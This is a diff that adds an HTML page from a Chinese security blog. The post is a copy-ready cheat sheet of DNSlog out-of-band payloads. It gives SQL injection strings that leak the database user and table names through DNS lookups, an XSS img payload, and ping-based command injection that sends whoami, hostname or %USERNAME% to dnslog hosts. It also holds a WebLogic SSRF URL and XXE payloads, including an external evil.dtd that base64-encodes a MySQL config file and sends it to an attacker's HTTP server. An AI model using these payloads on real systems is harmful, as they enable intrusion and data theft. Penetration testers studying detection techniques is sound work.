@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="DNSlog盲打命令记录简单的东西，记录方便复制。https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;RGw2KcZ8kLsXDOqNO2GuhA 0x00 SQLIload_file盲打的前提一般是root权限且设置了secure_file_priv=””，即为空。 1select load_file(concat(&amp;apos;\\\\&amp;apos;,(select hex(user())),&amp;apos;.dnslog\\a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNSlog盲打命令记录">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;09&#x2F;11&#x2F;DNSlog%E7%9B%B2%E6%89%93%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="DNSlog盲打命令记录简单的东西，记录方便复制。https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;RGw2KcZ8kLsXDOqNO2GuhA 0x00 SQLIload_file盲打的前提一般是root权限且设置了secure_file_priv=””，即为空。 1select load_file(concat(&amp;apos;\\\\&amp;apos;,(select hex(user())),&amp;apos;.dnslog\\a">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-09-11T03:37:46.505Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2021/09/11/DNSlog盲打命令记录/"/>
+
+
+
+
+
+  <title>DNSlog盲打命令记录 | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2021/09/11/DNSlog%E7%9B%B2%E6%89%93%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DNSlog盲打命令记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-11T11:26:17+08:00">
+                2021-09-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="DNSlog盲打命令记录"><a href="#DNSlog盲打命令记录" class="headerlink" title="DNSlog盲打命令记录"></a>DNSlog盲打命令记录</h1><p>简单的东西，记录方便复制。<a href="https://mp.weixin.qq.com/s/RGw2KcZ8kLsXDOqNO2GuhA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RGw2KcZ8kLsXDOqNO2GuhA</a></p>
+<h2 id="0x00-SQLI"><a href="#0x00-SQLI" class="headerlink" title="0x00 SQLI"></a>0x00 SQLI</h2><p>load_file盲打的前提一般是root权限且设置了secure_file_priv=””，即为空。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">user</span>())),<span class="string">'.dnslog\\aa'</span>));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>后面的aa文件存不存在不重要，随便写都行，但是必须要写，因为是load_file函数需要的条件。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and (select load_file(concat(&apos;//&apos;,(select hex(user())),&apos;.xxxx.ceye.io/as&apos;)))# //查看当前用户</span><br><span class="line">1&apos; and (select load_file(concat(&apos;//&apos;,(select database()),&apos;.xxxx.ceye.io/as&apos;)))#  //查数据库</span><br><span class="line">1&apos; and (select load_file(concat(&apos;//&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&apos;.xxxx.ceye.io/as&apos;)))#  //查询当前数据库第一个表，第二个类推</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">src</span>=<span class="string">http://xss.9e5ehg.dnslog.cn</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>插完payload能在dnslog看到记录则证明该处xss漏洞存在。</p>
+<h2 id="0x02-命令注入"><a href="#0x02-命令注入" class="headerlink" title="0x02 命令注入"></a>0x02 命令注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.us0r6c.dnslog.cn	//windows</span><br><span class="line">ping `whoami`.us0r6c.dnslog.cn 或者 x=`hostname`;ping -c 1 <span class="variable">$x</span>.d7jlma.dnslog.cn //linux</span><br></pre></td></tr></table></figure>
+
+<p> 查看dnslog的记录，会将我们查询的变量拼接在记录中。</p>
+<p>附带windows常见系统变量：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//变量                     类型       描述</span><br><span class="line">//<span class="variable">%ALLUSERSPROFILE%</span>        本地       返回“所有用户”配置文件的位置。</span><br><span class="line">//<span class="variable">%APPDATA%</span>                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class="line">//<span class="variable">%CD%</span>                     本地       返回当前目录字符串。</span><br><span class="line">//<span class="variable">%CMDCMDLINE%</span>             本地       返回用来启动当前的 <span class="built_in">Cmd</span>.exe 的准确命令行。</span><br><span class="line">//<span class="variable">%CMDEXTVERSION%</span>          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class="line">//<span class="variable">%COMPUTERNAME%</span>           系统       返回计算机的名称。</span><br><span class="line">//<span class="variable">%COMSPEC%</span>                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class="line">//<span class="variable">%DATE%</span>                   系统       返回当前日期。使用与 <span class="built_in">date</span> /t 命令相同的格式。由 <span class="built_in">Cmd</span>.exe 生成。有关 <span class="built_in">date</span> 命令的详细信息，请参阅 <span class="built_in">Date</span>。</span><br><span class="line">//<span class="variable">%ERRORLEVEL%</span>             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class="line">//<span class="variable">%HOMEDRIVE%</span>              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">//<span class="variable">%HOMEPATH%</span>               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">//<span class="variable">%HOMESHARE%</span>              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">//<span class="variable">%LOGONSERVER%</span>            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class="line">//<span class="variable">%NUMBER_OF_PROCESSORS%</span>   系统       指定安装在计算机上的处理器的数目。</span><br><span class="line">//<span class="variable">%OS%</span>                     系统       返回操作系统名称。Windows <span class="number">2000</span> 显示其操作系统为 Windows_NT。</span><br><span class="line">//<span class="variable">%PATH%</span>                   系统       指定可执行文件的搜索路径。</span><br><span class="line">//<span class="variable">%PATHEXT%</span>                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class="line">//<span class="variable">%PROCESSOR_ARCHITECTURE%</span> 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class="line">//<span class="variable">%PROCESSOR_IDENTFIER%</span>    系统       返回处理器说明。</span><br><span class="line">//<span class="variable">%PROCESSOR_LEVEL%</span>        系统       返回计算机上安装的处理器的型号。</span><br><span class="line">//<span class="variable">%PROCESSOR_REVISION%</span>     系统       返回处理器的版本号。</span><br><span class="line">//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 <span class="built_in">Cmd</span>.exe 生成。</span><br><span class="line">//<span class="variable">%RANDOM%</span>                 系统       返回 <span class="number">0</span> 到 <span class="number">32767</span> 之间的任意十进制数字。由 <span class="built_in">Cmd</span>.exe 生成。</span><br><span class="line">//<span class="variable">%SYSTEMDRIVE%</span>            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class="line">//<span class="variable">%SYSTEMROOT%</span>             系统       返回 Windows server operating system 根目录的位置。</span><br><span class="line">//<span class="variable">%TEMP%</span>和<span class="variable">%TMP%</span>            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class="line">//<span class="variable">%TIME%</span>                   系统       返回当前时间。使用与<span class="built_in">time</span> /t命令相同的格式。由<span class="built_in">Cmd</span>.exe生成。有关<span class="built_in">time</span>命令的详细信息，请参阅 <span class="built_in">Time</span>。</span><br><span class="line">//<span class="variable">%USERDOMAIN%</span>             本地       返回包含用户帐户的域的名称。</span><br><span class="line">//<span class="variable">%USERNAME%</span>               本地       返回当前登录的用户的名称。</span><br><span class="line">//<span class="variable">%USERPROFILE%</span>            本地       返回当前用户的配置文件的位置。</span><br><span class="line">//<span class="variable">%WINDIR%</span>                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-SSRF"><a href="#0x03-SSRF" class="headerlink" title="0x03 SSRF"></a>0x03 SSRF</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://rsr8pf.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+<p> 查看dnslog有记录，就很有可能存在ssrf漏洞 。</p>
+<h2 id="0x04-XXE"><a href="#0x04-XXE" class="headerlink" title="0x04 XXE"></a>0x04 XXE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://zhwzti.dnslog.cn&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br></pre></td></tr></table></figure>
+
+<p>无回显，但是可以看到dnslog收到请求，证明xxe漏洞存在。</p>
+<h3 id="盲打读文件"><a href="#盲打读文件" class="headerlink" title="盲打读文件"></a>盲打读文件</h3><p>VPS中放入一个DTD的文件，文件evil.dtd内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C://phpstudy_pro/Extensions/MySQL5.7.26/my.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://192.168.232.131:1333/?p=%file;&apos;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用python3开启http服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --<span class="built_in">bind</span> 0.0.0.0 1333</span><br></pre></td></tr></table></figure>
+
+<p>XXE处执行payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.232.131:1333/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;%int;%send;]&gt;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/09/05/JSP%E5%85%8D%E6%9D%80shell%E7%BB%95%E8%BF%87WD/" rel="next" title="JSP免杀shell绕过WD">
+                <i class="fa fa-chevron-left"></i> JSP免杀shell绕过WD
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DNSlog盲打命令记录"><span class="nav-number">1.</span> <span class="nav-text">DNSlog盲打命令记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-SQLI"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 SQLI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-XSS"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-命令注入"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-SSRF"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-XXE"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#盲打读文件"><span class="nav-number">1.5.1.</span> <span class="nav-text">盲打读文件</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
